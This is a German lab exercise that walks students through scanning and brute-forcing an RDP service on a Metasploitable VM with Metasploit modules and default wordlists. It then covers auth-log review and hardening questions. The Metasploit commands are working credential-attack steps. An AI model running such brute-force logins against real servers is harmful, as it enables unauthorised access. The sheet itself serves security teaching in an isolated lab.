# Übungsbeispiel 4: Brute-Force-Angriff auf ein Remote Desktop Protocol (RDP)

## Übersicht
Diese praktische Übung demonstriert die Sicherheitsrisiken von Remote Desktop Protocol (RDP) Diensten. 
Mithilfe von Metasploit werden verschiedene Angriffstechniken auf einen RDP-Server getestet:
- Port-Scanning zur Diensterkennung
- Brute-Force Attacken auf Zugangsdaten
- Analyse der Sicherheitslogs

Lernziele:
- Verstehen der RDP-Schwachstellen
- Praktische Erfahrung mit Penetration Testing Tools
- Entwicklung von Härtungsmaßnahmen

## Theoretische Aufgabe
1. Erkläre, warum schwache Passwörter ein großes Risiko bei RDP darstellen und recherchiere den Standard-Port.

## Praktische Übung - RDP Penetrationstest

### Voraussetzungen
- Kali Linux als Angreifer-System
- Metasploitable als Ziel-System
- Virtualisierungsumgebung
- Isoliertes Testnetzwerk

### Durchführung

1. **Vorbereitung des Zielsystems:**
   - Metasploitable starten und IP notieren
   - RDP-Dienst aktivieren:
   ```bash
   apt-get install xrdp
   /etc/init.d/xrdp start
   ```

2. **Reconnaissance:**
   ```bash
   # MSF-Konsole starten
   msfconsole
   
   # RDP-Scanner verwenden
   use auxiliary/scanner/rdp/rdp_scanner
   set RHOSTS [Ziel-IP]
   run
   ```

3. **Exploitation:**
   ```bash
   # RDP-Brute-Force-Modul
   use auxiliary/scanner/rdp/rdp_login
   set RHOSTS [Ziel-IP]
   set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
   set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
   run
   ```

4. **Log-Analyse:**
   - Auf dem Zielsystem:
   ```bash
   tail -f /var/log/auth.log
   grep "rdp" /var/log/auth.log
   ```

5. **Dokumentation:**
   - Gefundene Schwachstellen
   - Erfolgreiche/fehlgeschlagene Anmeldeversuche

### Auswertung
- Wie viele Anmeldeversuche wurden protokolliert?
- Welche Schwachstellen wurden identifiziert?
- Wie kann der RDP-Dienst gehärtet werden?
